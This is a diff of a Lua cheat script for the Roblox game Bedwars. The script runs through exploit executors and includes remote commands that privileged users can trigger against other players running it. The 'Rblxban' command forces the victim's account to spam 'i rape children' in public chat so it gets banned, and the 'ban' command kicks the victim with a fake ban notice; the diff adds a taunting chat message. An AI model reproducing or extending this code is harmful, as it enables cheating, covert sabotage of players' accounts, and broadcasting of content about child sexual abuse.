@@ -93,7 +93,7 @@ end
 
 local a=syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport or function()end
 game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(b)
-	if b==Enum.TeleportState.Started then a("pcall(function() shared.DNutLoaded = false end)") end end)
+	if b==Enum.TeleportState.Started then a("pcall(function() shared.VapeLoaded = false end)") end end)
 
 game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Wait()
 task.wait(0.2)
@@ -113,12 +113,14 @@ local clients = {
 		["IO12GP56P4LGR"] = "future",
 		["RQYBPTYNURYZC"] = "rektsky",
 		["DNUTC345CDAGH"] = "CLOWN 🤡",
+                ["GalaxyC345CDAGH"] = "Skids",
 	},
 	ChatStrings2 = {
 		["vape"] = "KVOP25KYFPPP4",
 		["future"] = "IO12GP56P4LGR",
 		["rektsky"] = "RQYBPTYNURYZC",
 		["CLOWN 🤡"] = "DNUTC345CDAGH",
+                ["Skids"] = "GalaxyC345CDAGH",
 	},
 	ClientUsers = {}
 }
@@ -451,11 +453,11 @@ local commands = {
 		workspace.Gravity = tonumber(args[1]) or 192.6
 	end,
         ["Lobby"] = function(args)
-  game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"].net.out["_NetManaged"].TeleportToLobby:FireServer()
+                  game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"].net.out["_NetManaged"].TeleportToLobby:FireServer()
 	end,
         ["Rblxban"] = function(args)
-  while task.wait(0.1) do
-    game:GetService("ReplicatedStorage")["DefaultChatSystemChatEvents"]["SayMessageRequest"]:FireServer("i rape children","All")
+                    while task.wait(0.1) do
+                    game:GetService("ReplicatedStorage")["DefaultChatSystemChatEvents"]["SayMessageRequest"]:FireServer("i rape children","All")
 	end,
 	["kick"] = function(args)
 		local str = ""
@@ -470,6 +472,7 @@ local commands = {
 	["ban"] = function(args)
 		task.spawn(function()
 			lplr:Kick("You have been temporarily banned. Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds")
+                      game:GetService("ReplicatedStorage")["DefaultChatSystemChatEvents"]["SayMessageRequest"]:FireServer("Bye Bye 😆","All")
 		end)
 		bedwars["ClientHandler"]:Get("TeleportToLobby"):SendToServer()
 	end,
